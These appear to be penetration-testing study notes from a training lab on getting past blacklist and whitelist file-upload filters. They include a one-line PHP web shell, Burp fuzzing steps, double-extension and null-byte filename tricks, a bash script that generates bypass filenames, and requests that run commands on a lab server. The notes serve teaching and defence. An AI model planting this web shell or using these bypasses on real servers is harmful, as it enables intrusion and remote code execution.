# File Upload – Blacklist Filters
### Summary

- Blacklist filters check only for disallowed file extensions.    
- These are incomplete and weak security mechanisms.
- Attackers can fuzz and find extensions that bypass the blacklist and still execute.
### How Blacklist Validation Works

```php
$fileName = basename($_FILES["uploadFile"]["name"]);
$extension = pathinfo($fileName, PATHINFO_EXTENSION);
$blacklist = array('php', 'php7', 'phps');

if (in_array($extension, $blacklist)) {
    echo "File type not allowed";
    die();
}
```
#### Weaknesses:

- Misses other PHP execution-capable extensions (`.php2`, `.phtml`, etc.)    
- Case-sensitive – e.g., `.pHp` might bypass
- Doesn't inspect MIME or content
- Only checks file extension, not behavior
### Fuzzing for Bypass Extensions
#### Goal: Find file extensions not present in the blacklist but still allowed by the server for execution
#### Steps:

1. Capture a valid upload request to `/upload.php` in Burp.    
2. Replace filename with: `filename="HTB.EXT"` — set `.EXT` as the Intruder position.
3. Load a list of PHP extensions from:
    - [PayloadsAllTheThings PHP Extensions](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/File%20Upload%20Vulnerabilities.md)
    - [SecLists Web Extensions](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-extensions.txt)
4. Set attack type to Sniper
5. Uncheck URL-encoding (so `.` isn’t encoded)
6. Start attack & sort by response length
### Valid Extensions (Example)

Extensions that returned `200 OK` and uploaded successfully might include:

- `.phtml`
- `.php3`
- `.php5`
- `.phar`
- `.pht`
- `.php2`

> These vary based on server config – test multiple
### Exploiting Non-Blacklisted Extensions

1. Replace content with PHP Web Shell:

```php
<?php system($_REQUEST['cmd']); ?>
```

2. Rename file as `shell.phtml`
3. Upload → verify success
4. Visit:

```
http://SERVER_IP/profile_images/shell.phtml?cmd=id
```
###### Output: `uid=33(www-data) gid=33(www-data)` confirms RCE
### Wordlists Used

- PHP Extensions Wordlist:  https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/File%20Upload%20Vulnerabilities.md
- Web Extensions List (SecLists): https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-extensions.txt
# File Upload – Whitelist Filters
### What is Whitelisting?

- **Whitelist = safer than blacklist**
- Only explicitly allowed extensions (e.g. jpg, png, gif) are accepted
- Used when only a few file types are expected (e.g., image uploads)
- Still bypassable via misconfigurations or faulty regex
### Whitelist Regex Example

```php
$fileName = basename($_FILES["uploadFile"]["name"]);

if (!preg_match('^.*\.(jpg|jpeg|png|gif)', $fileName)) {
    echo "Only images are allowed";
    die();
}
```
#### Issue:

- Does **not anchor to the end of string**
- Matches even `shell.jpg.php` or `a.gif.php5` etc.

Safer pattern:

```php
if (!preg_match('/^.*\.(jpg|jpeg|png|gif)$/', $fileName)) { ... }
```
### Bypass Techniques

#### 1. **Double Extensions**

- Example: `shell.jpg.php` 
- Passes `.jpg` check, but still executes `.php`

#### 2. **Reverse Double Extensions**

- Example: `shell.php.jpg`
- Bypasses strict regex
- Executes if server is misconfigured (e.g., Apache’s `php.conf` using unanchored regex)

```html
<FilesMatch ".+\.ph(ar|p|tml)">
    SetHandler application/x-httpd-php
</FilesMatch>
```

- Misses anchoring `$` → leads to unsafe execution
### Character Injection Bypass
#### Common injected characters:

```
%20  %0a  %00  %0d0a  /  .\  .  …  :
```
#### Examples:

- `shell.php%00.jpg` → PHP 5.x null byte truncation    
- `shell.aspx:.jpg` → NTFS alternate data stream (Windows servers)
### Generating Payloads – Bash Script

```bash
for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':'; do
    for ext in '.php' '.phps'; do
        echo "shell$char$ext.jpg" >> wordlist.txt
        echo "shell$ext$char.jpg" >> wordlist.txt
        echo "shell.jpg$char$ext" >> wordlist.txt
        echo "shell.jpg$ext$char" >> wordlist.txt
    done
done
```

- Output: `wordlist.txt` for Burp Intruder fuzzing
### Steps to Exploit

1. Upload file with trick extension (`.jpg.php`, `.php.jpg`) 
2. Confirm success via response / file browsing
3. Visit:

```
http://SERVER_IP/profile_images/shell.jpg.php?cmd=id
```

4. If vulnerable, code executes: `uid=33(www-data) gid=33(www-data)`   
### Wordlists & Tools
- Fuzz extensions using:
    - https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-extensions.txt
    - Custom script-generated `wordlist.txt`
# Tags
>  #Web-Exploitation #Exploitation #File-Upload-Attacks